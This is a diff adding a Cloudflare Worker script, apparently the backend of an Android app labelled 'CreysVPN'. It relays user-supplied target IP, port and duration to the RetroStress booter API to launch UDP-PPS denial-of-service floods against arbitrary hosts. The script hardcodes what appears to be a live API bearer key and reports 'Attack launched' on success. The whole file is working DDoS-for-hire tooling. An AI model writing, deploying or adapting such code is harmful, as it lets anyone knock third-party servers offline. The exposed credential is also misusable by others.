@@ -1,0 +1,128 @@
+// НАСТРОЙКИ
+const RETROSTRESS_API_URL = "https://retrostress.net/api/v1/tests";
+const RETROSTRESS_API_KEY = "58a155f44684a939625ddf42d5654248641b883f248e975739ec9f2bbab42a99";
+const ATTACK_METHOD = "UDP-PPS";
+const ATTACK_CONCURRENT = 4;
+
+// Обработчик запросов
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+  // CORS headers для Android app
+  const corsHeaders = {
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type',
+  };
+
+  // Обработка preflight запроса
+  if (request.method === 'OPTIONS') {
+    return new Response(null, { headers: corsHeaders });
+  }
+
+  // Обработка GET запроса (проверка статуса)
+  if (request.method === 'GET') {
+    return new Response(JSON.stringify({
+      status: 'online',
+      server: 'CreysVPN → RetroStress Proxy (Cloudflare)',
+      version: '1.0'
+    }), {
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+    });
+  }
+
+  // Обработка POST запроса
+  if (request.method === 'POST') {
+    try {
+      // Читаем тело запроса от Android
+      const body = await request.json();
+      
+      // Извлекаем данные
+      const { ip, port, time } = body;
+      
+      // Валидация
+      if (!ip || !port || !time) {
+        return new Response(JSON.stringify({
+          status: 'error',
+          message: 'Missing required fields: ip, port, time'
+        }), {
+          status: 400,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+
+      // Формируем payload для RetroStress
+      const retrostressPayload = {
+        target: ip,
+        port: parseInt(port),
+        duration: parseInt(time),
+        method: ATTACK_METHOD,
+        concurrent: ATTACK_CONCURRENT,
+        customId: `Creys Iteration ${Date.now()}`
+      };
+
+      // Логирование (видно в Cloudflare Logs)
+      console.log('📥 Received attack request:', { ip, port, time });
+      console.log('🚀 Sending to RetroStress:', retrostressPayload);
+
+      // Отправляем запрос на RetroStress API
+      const retrostressResponse = await fetch(RETROSTRESS_API_URL, {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${RETROSTRESS_API_KEY}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(retrostressPayload)
+      });
+
+      // Получаем ответ от RetroStress
+      const retrostressData = await retrostressResponse.text();
+      
+      console.log('📨 RetroStress response:', retrostressResponse.status, retrostressData);
+
+      // Если успешно
+      if (retrostressResponse.ok) {
+        return new Response(JSON.stringify({
+          status: 'success',
+          message: 'Attack launched via RetroStress',
+          target: `${ip}:${port}`,
+          duration: time,
+          method: ATTACK_METHOD
+        }), {
+          status: 200,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      } else {
+        // Если ошибка от RetroStress
+        return new Response(JSON.stringify({
+          status: 'error',
+          message: 'RetroStress API error',
+          details: retrostressData
+        }), {
+          status: retrostressResponse.status,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+
+    } catch (error) {
+      // Обработка ошибок
+      console.error('❌ Error:', error);
+      
+      return new Response(JSON.stringify({
+        status: 'error',
+        message: error.message
+      }), {
+        status: 500,
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+      });
+    }
+  }
+
+  // Неподдерживаемый метод
+  return new Response('Method not allowed', { 
+    status: 405,
+    headers: corsHeaders 
+  });
+}
